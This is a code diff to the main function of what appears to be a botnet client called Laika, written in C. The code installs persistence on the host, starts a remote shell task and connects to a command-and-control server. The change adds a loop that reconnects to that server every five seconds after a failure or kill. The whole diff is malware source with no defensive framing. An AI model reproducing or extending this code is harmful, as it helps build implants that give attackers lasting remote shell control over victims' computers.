@@ -17,26 +17,39 @@ void shellTask(struct sLaika_taskService *service, struct sLaika_task *task, clo
 }
 
 int main(int argv, char *argc[]) {
-    struct sLaika_bot *bot = laikaB_newBot();
+    struct sLaika_bot *bot;
 
     /* install persistence */
     laikaB_tryPersist();
 
-    /* init task service */
-    laikaT_initTaskService(&tService);
-    laikaT_newTask(&tService, 100, shellTask, (void*)bot);
+#ifdef LAIKA_PERSISTENCE
+    do {
+#endif
+        bot = laikaB_newBot();
 
-    /* connect to test CNC */
-    laikaB_connectToCNC(bot, LAIKA_CNC_IP, LAIKA_CNC_PORT);
+        /* init task service */
+        laikaT_initTaskService(&tService);
+        laikaT_newTask(&tService, 100, shellTask, (void*)bot);
 
-    /* while connection is still alive, poll bot */
-    while (laikaS_isAlive((&bot->peer->sock))) {
-        if (!laikaB_poll(bot, laikaT_timeTillTask(&tService))) {
-            laikaT_pollTasks(&tService);
-        }
-    }
+        LAIKA_TRY
+            /* connect to test CNC */
+            laikaB_connectToCNC(bot, LAIKA_CNC_IP, LAIKA_CNC_PORT);
 
-    laikaB_freeBot(bot);
-    LAIKA_DEBUG("bot killed\n");
+            /* while connection is still alive, poll bot */
+            while (laikaS_isAlive((&bot->peer->sock))) {
+                if (!laikaB_poll(bot, laikaT_timeTillTask(&tService))) {
+                    laikaT_pollTasks(&tService);
+                }
+            }
+        LAIKA_TRYEND
+
+        /* bot was killed or it threw an error */
+        laikaT_cleanTaskService(&tService);
+        laikaB_freeBot(bot);
+#ifdef LAIKA_PERSISTENCE
+        sleep(5);
+    } while (1);
+#endif
+
     return 0;
 }
